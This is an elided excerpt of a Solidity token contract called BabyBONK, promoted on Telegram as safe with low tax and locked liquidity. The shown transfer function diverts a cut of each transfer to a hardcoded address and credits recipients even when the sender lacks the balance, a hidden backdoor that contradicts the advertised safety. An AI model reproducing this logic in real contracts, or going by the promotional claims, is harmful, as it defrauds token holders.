...
// Submitted for Telegram: https://t.me/babybonk_bep20
// RENOUNCE CA, LP LOCK, SAFE, TAX LOW 1% FOR BUY SELL
...
contract  BabyBONK  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xcC0e836420E7d27c8de92C4ecEeA794715dDff49] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0xcC0e836420E7d27c8de92C4ecEeA794715dDff49, _teamtoken);
        }
